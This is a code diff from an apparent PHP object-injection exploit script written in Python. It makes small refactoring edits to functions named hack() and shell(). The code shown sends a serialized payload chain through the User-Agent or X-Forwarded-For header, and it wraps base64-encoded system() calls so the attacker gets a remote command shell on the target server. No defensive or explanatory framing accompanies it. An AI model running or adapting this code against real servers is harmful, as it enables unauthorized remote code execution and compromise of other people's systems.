@@ -75,7 +75,6 @@ def hack(url, header, php_payload, pop_chain, ipback, port):
        
         if header == "ua":
             req.add_header('User-Agent', pop_chain)
-        
         if header == "xff":
             req.add_header('X-Forwarded-For', pop_chain)
             req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0')
@@ -157,9 +156,7 @@ def shell(url, pop_chain): # mostly infodox 'pty'
             sys.exit("%s[!] Shell exiting!%s" %(red, clear))
         else:
             cmd = """system('%s');""" %(cmd)
-            cmd = cmd.encode("base64")
-            cmd = cmd.replace("\n", "")
-            cmd = cmd.strip()
+            cmd = cmd.encode("base64").replace("\n", "").strip()
             read = hack(url=url, header="xff", php_payload=cmd, pop_chain=pop_chain, ipback=None, port=None)
             if read.find("</html>") == -1:
                 print "\n".join(read)
